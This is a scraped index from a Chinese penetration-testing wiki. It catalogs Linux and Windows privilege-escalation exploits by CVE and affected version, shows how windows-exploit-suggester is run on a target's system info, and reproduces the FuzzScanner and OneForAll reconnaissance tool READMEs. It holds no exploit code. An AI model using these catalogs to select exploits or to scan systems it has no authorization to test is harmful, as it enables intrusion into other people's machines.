[pipe.c_32bit](2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28, 2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31) CVE-2009-2698　　[udp_sendmsg_32bit](2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19) CVE-2009-2692　　[sock_sendpage](2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28, 2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30) CVE-2009-2692　　[sock_sendpage2](2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28, 2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30) CVE-2009-1337　　[exit_notify](2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29) CVE-2009-1185　　[udev](2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-07 14:55:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2010/1.html":{"url":"提权EXP/Linux/2010/1.html","title":"2010","keywords":"","body":" CVE-2010-4347　　[american-sign-language]( 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36) CVE-2010-4258　　[full-nelson](2.6.31, 2.6.32, 2.6.35, 2.6.37) CVE-2010-4073　　[half_nelson](2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36) CVE-2010-3904　　[rds](2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36) CVE-2010-3437　　[pktcdvd](2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36) CVE-2010-3301　　[ptrace_kmod2](2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34) CVE-2010-3081　　[video4linux](2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33) CVE-2010-2959　　[can_bcm](2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36) CVE-2010-1146　　[reiserfs](2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34) CVE-2010-0415　　[do_pages_move](2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-07 14:56:55 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2012/1.html":{"url":"提权EXP/Linux/2012/1.html","title":"2012","keywords":"","body":" CVE-2012-3524　　[libdbus](libdbus 1.5.x and earlier) CVE-2012-0056　　[memodipper](2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-07 14:57:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2013/1.html":{"url":"提权EXP/Linux/2013/1.html","title":"2013","keywords":"","body":" CVE-2013-2094　　[perf_swevent](3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4.0, 3.4.1, 3.4.2, 3.4.3, 3.4.4, 3.4.5, 3.4.6, 3.4.8, 3.4.9, 3.5, 3.6, 3.7, 3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9) CVE-2013-1858　　[clown-newuser](3.3-3.8) CVE-2013-1763　　[__sock_diag_rcv_msg](before 3.8.3) CVE-2013-0268　　[msr](2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37, 2.6.38, 2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7.0, 3.7.6) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-07 14:58:13 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2014/1.html":{"url":"提权EXP/Linux/2014/1.html","title":"2014","keywords":"","body":" CVE-2014-5284　　[OSSEC](2.8) CVE-2014-4699　　[ptrace](before 3.15.4) CVE-2014-4014　　[Local Privilege Escalation](before 3.14.8) CVE-2014-3153　　[futex](3.3.5 ,3.3.4 ,3.3.2 ,3.2.13 ,3.2.9 ,3.2.1 ,3.1.8 ,3.0.5 ,3.0.4 ,3.0.2 ,3.0.1 ,2.6.39 ,2.6.38 ,2.6.37 ,2.6.35 ,2.6.34 ,2.6.33 ,2.6.32 ,2.6.9 ,2.6.8 ,2.6.7 ,2.6.6 ,2.6.5 ,2.6.4 ,3.2.2 ,3.0.18 ,3.0 ,2.6.8.1) CVE-2014-0196　　[rawmodePTY](2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37, 2.6.38, 2.6.39, 3.14, 3.15) CVE-2014-0038　　[timeoutpwn](3.4, 3.5, 3.6, 3.7, 3.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13, 3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6, 3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-07 14:58:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2015/1.html":{"url":"提权EXP/Linux/2015/1.html","title":"2015","keywords":"","body":" CVE-2015-7547　　[glibc getaddrinfo](before Glibc 2.9) CVE-2015-1328　　[overlayfs](3.13, 3.16.0, 3.19.0) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-07 14:59:13 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2016/1.html":{"url":"提权EXP/Linux/2016/1.html","title":"2016","keywords":"","body":" CVE-2016-9793　　[a signedness issue with SO_SNDBUFFORCE and SO_RCVBUFFORCE socket options](Linux kernel before 4.8.14) CVE-2016-5195　　[Dirty cow](Linux kernel>2.6.22 (released in 2007)) CVE-2016-2384　　[a double-free in USB MIDI driver](Linux kernel before 4.5) CVE-2016-0728　　[pp_key](3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-07 14:59:40 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2017/1.html":{"url":"提权EXP/Linux/2017/1.html","title":"2017","keywords":"","body":" CVE-2017-1000367　　[Sudo] (Sudo 1.8.6p7 - 1.8.20) CVE-2017-1000112　　[a memory corruption due to UFO to non-UFO path switch] CVE-2017-16995　　[Memory corruption caused by BPF verifier] (Linux kernel before 4.14 - 4.4) CVE-2017-16939　　[UAF in Netlink socket subsystem – XFRM] (Linux kernel before 4.13.11) CVE-2017-7494　　[Samba Remote execution](Samba 3.5.0-4.6.4/4.5.10/4.4.14) CVE-2017-7308　　[a signedness issue in AF_PACKET sockets](Linux kernel through 4.10.6) CVE-2017-6074　　[a double-free in DCCP protocol](Linux kernel through 4.9.11) CVE-2017-5123　　['waitid()'](Kernel 4.14.0-rc4+) , 3.9, 3.10, 3.11, 3.12, 3.13, 3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6, 3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-07 15:00:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2018/1.html":{"url":"提权EXP/Linux/2018/1.html","title":"2018","keywords":"","body":" CVE–2018–18955　　[map_write() in kernel/user_namespace.c allows privilege escalation](Linux kernel 4.15.x through 4.19.x before 4.19.2) CVE–2018–1000001　　[glibc](glibc 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-07 15:00:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2019/1.html":{"url":"提权EXP/Linux/2019/1.html","title":"2019","keywords":"","body":" CVE-2019-13272　　[Linux Kernel](Linux Kernel 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-07 21:39:03 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Win/2.html":{"url":"提权EXP/Win/2.html","title":"Windows提权总结","keywords":"","body":"windows提权exp汇总 下载地址 Win2003 Win2008 Win2012 Win2016 Vista XP Win7 Win8 Win10 Win2019 Win2010 Win2000 CVE-2019-0803 ✅ ✅ ✅ ✅ ✅ ✅ CVE-2018-8897 ✅ ✅ ✅ ✅ ✅ CVE-2018-8639 ✅ ✅ ✅ ✅ ✅ ✅ CVE-2018-1038 ✅ ✅ CVE-2018-0734 ✅ CVE-2018-8453 ✅ ✅ ✅ CVE-2018-8440 ✅ ✅ ✅ ✅ ✅ ✅ CVE-2018-0833 ✅ ✅ CVE-2018-8021 ✅ ✅ ✅ ✅ CVE-2018-8120 ✅ ✅ CVE-2018-0824 ✅ ✅ ✅ ✅ ✅ CVE-2017-8464 ✅ ✅ ✅ ✅ ✅ ✅ CVE-2017-0213 ✅ ✅ ✅ ✅ ✅ ✅ MS17-017 ✅ ✅ MS17-010 ✅ ✅ ✅ ✅ MS16-135 ✅ MS16-111 ✅ ✅ MS16-098 ✅ MS16-075 ✅ ✅ ✅ ✅ ✅ MS16-034 ✅ ✅ ✅ ✅ ✅ MS16-032 ✅ ✅ ✅ ✅ ✅ MS16-016 ✅ ✅ ✅ MS16-014 ✅ ✅ ✅ MS15-097 ✅ ✅ MS15-076 ✅ ✅ ✅ ✅ ✅ MS15-077 ✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ MS15-061 ✅ ✅ ✅ ✅ ✅ MS15-051 ✅ ✅ ✅ ✅ ✅ MS15-015 ✅ ✅ ✅ ✅ MS15-010 ✅ ✅ ✅ ✅ MS15-001 ✅ ✅ ✅ ✅ CVE-2014-1767 ✅ ✅ ✅ ✅ ✅ ✅ MS14-070 ✅ MS14-068 ✅ ✅ ✅ ✅ ✅ MS14-066 ✅ ✅ ✅ ✅ ✅ ✅ MS14-058 ✅ ✅ ✅ ✅ ✅ MS14-040 ✅ ✅ ✅ ✅ ✅ MS14-002 ✅ ✅ MS13-053 ✅ ✅ ✅ ✅ ✅ MS13-046 ✅ ✅ ✅ ✅ ✅ MS13-005 ✅ ✅ ✅ ✅ ✅ MS12-042 ✅ ✅ ✅ MS12-020 ✅ ✅ ✅ ✅ MS11-080 ✅ ✅ MS11-062 ✅ ✅ MS11-046 ✅ ✅ ✅ ✅ MS11-011 ✅ ✅ ✅ ✅ ✅ MS10-092 ✅ ✅ MS10-065（iis5.1/6.0/7.0/7.5） Iis Iis Iis Iis Iis Iis Iis Iis Iis Iis Iis Iis MS10-059 ✅ ✅ ✅ MS10-048 ✅ ✅ ✅ ✅ ✅ MS10-015 ✅ ✅ ✅ ✅ MS10-012 ✅ ✅ MS09-050 ✅ ✅ MS09-020（iis5.1/6.1） iis iis iis iis iis iis iis iis iis iis iis iis MS09-012 ✅ ✅ ✅ MS08-068 ✅ ✅ MS08-067 ✅ ✅ ✅ ✅ ✅ MS08-066 ✅ ✅ ✅ MS08-025 ✅ ✅ ✅ ✅ MS06-040 ✅ ✅ ✅ MS05-039 ✅ ✅ ✅ MS03-026 ✅ ✅ ✅ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-20 23:36:32 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Win/1.html":{"url":"提权EXP/Win/1.html","title":"Win辅助提权脚本","keywords":"","body":"win辅助提权脚本 https://github.com/ianxtianxt/win-exp- 使用方法 1.首先需要更新漏洞数据库 $ ./windows-exploit-suggester.py --update [*] initiating... [*] successfully requested base url [*] scraped ms download url [+] writing to file 2017-06-14-mssb.xls [*] done 2.然后安装程序依赖：python-xlrd //pip install install dependencies //install python-xlrd, $ pip install xlrd --upgrade ubuntu@ubuntu:~/xlrd-0.9.4/xlrd-0.9.4$ sudo python setup.py install [sudo] password for ubuntu: running install running build running build_py running build_scripts running install_lib creating /usr/local/lib/python2.7/dist-packages/xlrd copying build/lib.linux-x86_64-2.7/xlrd/compdoc.py -> /usr/local/lib/python2.7/dist-packages/xlrd ...... 3.接着在目标机器中执行systeminfo，并将其输出到文件 win7sp1-systeminfo.txt 中，然而带入参数 –systeminfo 中，并指定数据库位置(就是那个excel文件) $ ./windows-exploit-suggester.py --database 2017-06-14-mssb.xls --systeminfo win7sp1-systeminfo.txt [*] initiating... [*] database file detected as xls or xlsx based on extension [*] reading from the systeminfo input file [*] querying database file for potential vulnerabilities [*] comparing the 15 hotfix(es) against the 173 potential bulletins(s) [*] there are now 168 remaining vulns [+] windows version identified as 'Windows 7 SP1 32-bit' [*] [M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical [E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important [M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical [M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical [M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical [M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical [M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical [M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical [M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical [M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important [*] done 下面这条指令可以列出指定操作系统版本存在的所有可能EXP(假设目标系统没有打任何补丁) $ ./windows-exploit-suggester.py --database 2017-06-14-mssb.xls --ostext 'windows server 2008 r2' [*] initiating... [*] database file detected as xls or xlsx based on extension [*] getting OS information from command line text [*] querying database file for potential vulnerabilities [*] comparing the 0 hotfix(es) against the 196 potential bulletins(s) [*] there are now 196 remaining vulns [+] windows version identified as 'Windows 2008 R2 64-bit' [*] [M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical [M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important [E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important [M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important [M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical [E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Im 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-07 23:31:03 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/子域名扫描/FuzzScan.html":{"url":"Tools/子域名扫描/FuzzScan.html","title":"FuzzScan","keywords":"","body":" FuzzScanner 一个用来进行信息搜集的工具集，主要是用于对网站子域名、开放端口、端口指纹、c段地址、敏感目录、链接爬取等信息进行批量搜集。 fuzzScanner可用于批量快速的搜集网站信息，比别人更快一步的发现其他端口的应用或者网站管理后台等，也适合src漏洞挖掘的前期信息搜集。 开发初衷比较简单，当时正在参加一些攻防演练，需要快速的对目标网站进行子域名发现、端口扫描、目录扫描等，手头上有一些分散的工具，比如lijiejie的subdomains、子域名挖掘机、dirsearch等等，但当目标任务量比较大时，这些重复性的工作就会比较费时费力，所以就有了这么个集合十八种杀人武器于一身的“超级武器”——fuzzScanner。 因为当时着急用，所以很多功能的实现都是直接命令行调用的其他工具，再次非常感谢wydomain、WhatWeb、subDomainsBrute、dirsearch、wafw00f等开源平台。 Change_Log [2018-04-05] 对多线程进行了优化，对异常进行了预处理 [2018-04-03] 完成基础功能 安装 常规安装 平台开发和运行都是在linux环境下，windows未测试，wydomain、WhatWeb、subDomainsBrute、dirsearch、wafw00f等工具均已放在libs目录下，默认可直接调用。 使用比较简单： 从github上拖下来 git clone https://github.com/TideSec/FuzzScanner 安装requirements.txt依赖 pip install -r requirements.txt 安装ruby环境，以便运行whatweb sudo yum install ruby # CentOS, Fedora, 或 RHEL 系统 sudo apt-get install ruby-full # Debian 或 Ubuntu 系统 安装namp yum install nmap # CentOS, Fedora, 或 RHEL 系统 apt-get install nmap # Debian 或 Ubuntu 系统 运行脚本，因为调用nmap需要root权限，所以需要sudo。 sudo python FuzzScanner.py docker镜像 为了避免部署的各种问题，直接做了个镜像放在了阿里云上，docker直接pull下来就可以。 docker pull registry.cn-hangzhou.aliyuncs.com/secplus/tide-fuzzscanner:1.0 使用docker images查看docker镜像信息 root@Docker:~# docker images REPOSITORY TAG IMAGE ID CREATED SIZE registry.cn-hangzhou.aliyuncs.com/secplus/tide-fuzzscanner 1.0 52341fc71d0a 5 minutes ago 1.36GB 创建docker并进入docker docker run --name fuzzscanner -t -i 52341fc71d0a /bin/bash 执行fuzzscanner root@Docker:~# docker run --name fuzzscanner -t -i 52341fc71d0a /bin/bash [root@a7edd0d9fdad /]# cd /root/FuzzScanner/ [root@a7edd0d9fdad FuzzScanner]# python FuzzScanner.py python FuzzScanner.py -hc target.com --> domain && web finger && Dir scan && C scan python FuzzScanner.py -Hc vuln_domains.txt --> domain && web finger && Dir scan && C scan python FuzzScanner.py -hca target.com --> domain && web finger && Dir scan && C scan && C allport python FuzzScanner.py -Hca vuln_domains.txt --> domain && web finger && Dir scan && C scan && C allport python FuzzScanner.py -h target.com --> domain && web finger && Dir scan python FuzzScanner.py -H vuln_domains.txt --> domain && web finger && Dir scan python FuzzScanner.py -c 192.168.1.1 --> C scan python FuzzScanner.py -cd 192.168.1.1 --> C scan && Dir scan python FuzzScanner.py -C vuln_ip.txt --> C scan python FuzzScanner.py -Cd vuln_ip.txt --> C scan && Dir scan python FuzzScanner.py -ca 192.168.1.1 --> C scan && C allport python FuzzScanner.py -Ca vuln_ip.txt --> C scan && C allport 使用 使用比较简单，参数设置说明。 python FuzzScanner.py -hc target.com --> domain && web finger && Dir scan && C scan 设置单个目标网站，子域名枚举 && web指纹识别 && 目录枚举 && C段扫描 python FuzzScanner.py -Hc vuln_domains.txt --> domain && web finger && Dir scan && C scan 从文件读取单个或多个目标网站，子域名枚举 && web指纹识别 && 目录枚举 && C段扫描 python FuzzScanner.py -hca target.com --> domain && web finger && Dir scan && C scan && C allport 设置单个目标网站，子域名枚举 && web指纹识别 && 目录枚举 && C段全端口扫描 python FuzzScanner.py -Hca vuln_domains.txt --> domain && web finger && Dir scan && C scan && C allport 从文件读取单个或多个目标网站，子域名枚举 && web指纹识别 && 目录枚举 && C段全端口扫描 python FuzzScanner.py -h target.com --> domain && web finger && Dir scan 设置单个目标网站，子域名枚举 && web指纹识别 && 目录枚举 python FuzzScanner.py -H vuln_domains.txt --> domain && web finger && Dir scan 从文件读取单个或多个目标网站，子域名枚举 && web指纹识别 && 目录枚举 python FuzzScanner.py -c 192.168.1.1 --> C scan 设置单个IP，进行C段地址探测 python FuzzScanner.py -cd 192.168.1.1 --> C scan && Dir scan 设置单个IP，进行C段地址探测并对web服务进行目录枚举 python FuzzScanner.py -C vuln_ip.txt --> C scan 从文件读取单个或多个目标IP地址，进行C段地址探测 python FuzzScanner.py -Cd vuln_ip.txt --> C scan && Dir scan 从文件读取单个或多个目标IP地址，进行C段地址探测并对web服务进行目录枚举 python FuzzScanner.py -ca 192.168.1.1 --> C scan && C allport 设置单个IP，进行C段地址探测和全端口扫描 python FuzzScanner.py -Ca vuln_ip.txt --> C scan && C allport 从文件读取单个或多个目标IP地址，进行C段地址探测和全端口扫描 主要功能 子域名枚举 当输入目标站点域名后，会使用以下4种方式进行子域名的枚举。 1、百度链接爬取，会使用site：xxx.com为关键字爬取所有子域名； 2、网站友链爬取，会对自身3层链接目录进行爬取，搜集子域名； 3、本利想对chaxunla、aizhan之类的子域名查询接口进行查询，后来发现猪猪侠的wydomain已经实现了这个功能，就直接调用了wydomain； 4、使用了subdomains进行子域名的暴力枚举 端口扫描 端口扫描和指纹获取主要依赖于nmap，主要过程如下。该流程类似之前的另一个扫描器https://github.com/TideSec/WDScanner 1、首先根据参数设置情况判断是全端口扫描还是部分端口扫描； 2、如果扫描目标是网站地址，会根据目标开放的端口进行指纹获取，如果某端口服务为web服务，还会继续进行web指纹的获取； 3、如果扫描目标是ip地址或地址段，会先试用pynamp进行存活主机判断，然后使用socket端口探测的方式探测存活主机，然后再使用nmap进行端口的扫描和指纹的获取。 指纹识别 主要调用了whatweb、wafw00f、whatcms等进行了web指纹的识别。 1、当扫描web地址或探测到某端口为web服务时，会使用whatweb探测该站点信息，提取关键字段； 2、使用了wafw00f来探测是否存在waf，这样对有waf的不太好啃的站点可以暂时放弃； 3、对web站点进行了目录枚举，可能直接发行管理后台地址或备份文件等； 其他功能 在一些c段主机扫描、目录枚举、可能存在的威胁页面等方面进行了判断。 1、在扫描子域名时会解析其ip地址，并把改ip地址作为目标系统的C段地址，如设置了c段扫描的参数时会自动扫描其c段地址； 2、当扫描web地址或探测到某端口为web服务时，会自动进行了web指纹探测，并调用dirsearch进行目录枚举； 3、在检测到端口或Url地址中存在可能的漏洞点时，会输出到vulnerable.txt，比如.action及其他一些动态页面时。 结果保存 由于这些扫描结果需要后续人工逐个测试，为了方便就直接保存了txt，未保存数据库。 扫描完成后的结果保存log目录，最主要的就是该站点log根目录下的几个txt文档，比如下图中的vipshop.com-sub_info.txt、vipshop.com-domain.txt、vipshop.com-c_ip.txt、vipshop.com-c_ip_info.txt等。 1、sub目录下为各子站点的各相应详细信息，方便回溯； 2、spider是对各目标系统的爬虫记录，并区分了动态链接、外部链接等； 3、domain目录是wydomain、subdomians等的子域名记录； 4、c_ip目录为ip地址扫描的相关信息； 注意事项 1、在扫描c段时，如果选择了全端口扫描，速度会比较慢，但可能会有惊喜。适合有个服务器放上面慢慢跑。 2、如果选择了目录枚举，可能速度也会比较慢，目录枚举是直接用的dirsearch，在启用该功能后当发现某端口为web服务时就会调用dirsearch。 3、代码写的比较乱，单个文件1500行，导致后期我想再完善时看着头大。。感兴趣的可以一起探讨下~~ Screenshot 参数设置 设置好目标后开始扫描 保存的主要结果，以vipshop.com和guazi.com为例，保存了网站信息、网站标题、中间件信息、waf信息、端口信息、目录扫描信息等等。 Thanks 这个工具其实没什么技术含量，主要是集合了这些大牛的平台，再次感谢。 https://github.com/lijiejie/subDomainsBrute https://github.com/ring04h/wydomain https://github.com/EnableSecurity/wafw00f https://github.com/urbanadventurer/whatweb https://github.com/maurosoria/dirsearch 关注我们 TideSec安全团队： Tide安全团队正式成立于2019年1月，是以互联网攻防技术研究为目标的安全团队，目前聚集了十多位专业的安全攻防技术研究人员，专注于网络攻防、Web安全、移动终端、安全开发、IoT/物联网/工控安全等方向。 想了解更多Tide安全团队，请关注团队官网: http://www.TideSec.net 或关注公众号： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-05-20 18:19:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/子域名扫描/OneForAll.html":{"url":"Tools/子域名扫描/OneForAll.html","title":"OneForAll","keywords":"","body":"OneForAll &#x1F44A;OneForAll是一款功能强大的子域收集工具 &#x1F4DD;English Document &#x1F389;项目简介 项目主页：https://shmilylty.github.io/OneForAll/ 项目地址：https://github.com/shmilylty/OneForAll 在渗透测试中信息收集的重要性不言而喻，子域收集是信息收集中必不可少且非常重要的一环，目前网上也开源了许多子域收集的工具，但是总是存在以下部分问题： 不够强大，子域收集的接口不够多，不能做到对批量子域自动收集，没有自动子域解析，验证，FUZZ以及信息拓展等功能。 